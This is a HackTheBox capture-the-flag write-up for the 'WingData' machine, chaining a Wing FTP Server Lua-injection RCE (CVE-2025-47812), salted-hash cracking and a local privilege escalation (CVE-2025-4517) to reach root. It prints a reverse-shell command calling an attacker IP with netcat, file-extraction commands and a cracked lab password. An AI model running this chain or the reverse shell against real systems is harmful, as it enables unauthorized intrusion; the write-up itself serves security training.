# HTB — WingData Writeup

> **Date:** April 21, 2026  
> **Platform:** HackTheBox  
> **Category:** Web / Network Penetration Testing  
> **Tags:** `Writeups` `Web` `HTB` `RCE` `PrivEsc` `CVE-2025-47812` `CVE-2025-4517`

---

![WingData Banner](assets/images/WingData-6.png)

Welcome to the **WingData** walkthrough on HackTheBox! In this writeup, we detail the complete attack lifecycle—from exploiting an unauthenticated `NULL`-byte Lua injection RCE in Wing FTP Server to cracking salted password hashes and leveraging a local privilege escalation to achieve root access.

---

## 1. Reconnaissance & Initial Discovery

### Service Enumeration
During initial service scanning and web enumeration, we discover a web portal hosted on the target machine running **Wing FTP Server**.

![Wing FTP Server Web Client](assets/images/WingData-2.png)

- **Software:** Wing FTP Server v7.4.3
- **Known Vulnerability:** CVE-2025-47812 (Unauthenticated Remote Code Execution)

### Vulnerability Identified
- **CVE-2025-47812**: Unauthenticated Remote Code Execution (RCE)
- **Mechanism**: Improper handling of `NULL` bytes in the `username` parameter during login, leading to Lua code injection into active session files.
- **Affected Versions**: Wing FTP Server versions prior to `7.4.4`.

---

## 2. Web Application Exploitation

### Initial RCE & File Enumeration
1. Exploited the RCE vulnerability to execute arbitrary commands and list the application root directory, revealing key folders:

   ```text
   Data/
   License.txt
   Log/
   lua/
   pid-wftpserver.pid
   README
   session/
   session_admin/
   version.txt
   webadmin/
   webclient/
   wftpconsole
   wftp_default_ssh.key
   wftp_default_ssl.crt
   wftp_default_ssl.key
   wftpserver
   ```

   > [!NOTE]
   > Default SSH keys were found in the web directory (`wftp_default_ssh.key`), but were not directly usable for system access.

2. Searched for sensitive files within restricted folders using the web command execution vector:
   ```bash
   find Data -type f
   ```

3. Located user configuration XML files (e.g., `Data/1/users/maria.xml`).

4. Extracted file contents reliably by base64-encoding on the target and decoding locally to avoid character truncation:
   ```bash
   # On target
   base64 Data/1/users/maria.xml
   
   # Locally
   base64 -d maria.b64 > maria.xml
   ```

### Spawning a Reverse Shell
1. Started a local Netcat listener:
   ```bash
   nc -lvnp 5555
   ```

2. Executed a Python exploit script targeting CVE-2025-47812 to trigger a reverse callback:
   ```bash
   python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.14.79 5555 -e /bin/sh" -v
   ```

3. Established initial foothold as the `wingftp` service user.

---

## 3. Local Reconnaissance & Pivot to User

### User Enumeration
Inspected `/etc/passwd` to identify interactive users on the system:
- `wingftp` (UID 1000) — Current low-privilege user context.
- `wacky` (UID 1001) — Target user account for lateral movement.

### Password Hash Extraction & Cracking
1. Located a settings file containing salted password hashes:

   ![Salt & Hash Configuration](assets/images/WingData-3.png)

2. Identified the hashing algorithm as **SHA-256** with a static hardcoded salt: `WingFTP`.

3. Prepared the hash for cracking:
   ```bash
   echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > salted_hash.txt
   ```

4. Cracked the hash using John the Ripper / Hashcat, revealing valid credentials for `wacky`:
   - **Username:** `wacky`
   - **Password:** `!#7Blushing^*Bride5`

### Lateral Movement
- Authenticated via SSH using the cracked credentials to get a stable interactive terminal session:
  ```bash
  ssh wacky@wingdata.htb
  ```

- Retrieved the user flag:
  ```bash
  cat ~/user.txt
  ```

---

## 4. Privilege Escalation to Root

### Vulnerability Discovery
1. Enumerated current user privileges and `sudo` capabilities:
   ```bash
   whoami
   id
   sudo -l
   ```

   ![Sudo Permissions Output](assets/images/WingData-4.png)

2. Identified an unpatched local privilege escalation vulnerability: **CVE-2025-4517**.

### Exploitation Steps
1. Transferred the Proof of Concept (PoC) exploit to the target machine via SCP:
   ```bash
   scp CVE-2025-4517-POC.py wacky@10.129.233.238:/tmp/
   ```

2. Executed the local privilege escalation exploit:
   ```bash
   python3 /tmp/CVE-2025-4517-POC.py
   ```

3. Successfully escalated privileges and obtained a root shell session.

### Root Flag
- Retrieved the final root flag:
  ```bash
  cat /root/root.txt
  ```

---


## 5. Attack Chain Flow

<div style="background: rgba(15, 23, 42, 0.7); border: 1px solid rgba(56, 189, 248, 0.25); border-radius: 16px; padding: 2rem 1.5rem 2rem 1.5rem; margin: 2rem 0; box-shadow: 0 20px 40px -15px rgba(0, 0, 0, 0.5);">
  <div style="position: relative; padding-left: 2.25rem;">
    <div style="position: absolute; left: 0.85rem; top: 0.5rem; bottom: 0.5rem; width: 3px; background: linear-gradient(180deg, #38bdf8 0%, #f59e0b 30%, #c084fc 60%, #34d399 80%, #ef4444 100%); border-radius: 3px; box-shadow: 0 0 12px rgba(56, 189, 248, 0.4);"></div>
    <div style="display: flex; flex-direction: column; gap: 1.5rem;">
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #38bdf8; color: #38bdf8; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(56, 189, 248, 0.6);">01</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #38bdf8; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 1 · Recon</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Web Recon</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #38bdf8; color: #38bdf8; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(56, 189, 248, 0.6);">02</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #38bdf8; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 1 · Discovery</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Identified Wing FTP Server v7.4.3</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #f59e0b; color: #f59e0b; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(245, 158, 11, 0.6);">03</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(245, 158, 11, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #f59e0b; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 2 · Exploitation</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">CVE-2025-47812 (Unauth RCE via NULL byte in username)</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #f59e0b; color: #f59e0b; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(245, 158, 11, 0.6);">04</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(245, 158, 11, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #f59e0b; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 2 · Foothold</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Initial Foothold as wingftp user</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #c084fc; color: #c084fc; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(192, 132, 252, 0.6);">05</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(192, 132, 252, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #c084fc; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 3 · Enumeration</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Enumerated Data/1/users/maria.xml</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #c084fc; color: #c084fc; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(192, 132, 252, 0.6);">06</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(192, 132, 252, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #c084fc; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 3 · Hash Extraction</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Extracted SHA-256 hash (static salt: WingFTP)</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #c084fc; color: #c084fc; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(192, 132, 252, 0.6);">07</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(192, 132, 252, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #c084fc; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 3 · Hash Cracking</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Cracked hash → wacky:!#7Blushing^*Bride5</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #34d399; color: #34d399; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(52, 211, 153, 0.6);">08</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(52, 211, 153, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #34d399; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 4 · Pivot & User Flag</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">SSH login as wacky → Retrieved user.txt</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #ef4444; color: #ef4444; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(239, 68, 68, 0.6);">09</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(239, 68, 68, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #ef4444; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 5 · PrivEsc Recon</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">sudo -l / Enumeration revealed CVE-2025-4517</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #ef4444; color: #ef4444; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(239, 68, 68, 0.6);">10</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(239, 68, 68, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #ef4444; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 5 · Root Escalation</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Executed PoC → Gained root shell → Retrieved root.txt</div>
        </div>
      </div>
    </div>
  </div>
</div>

---

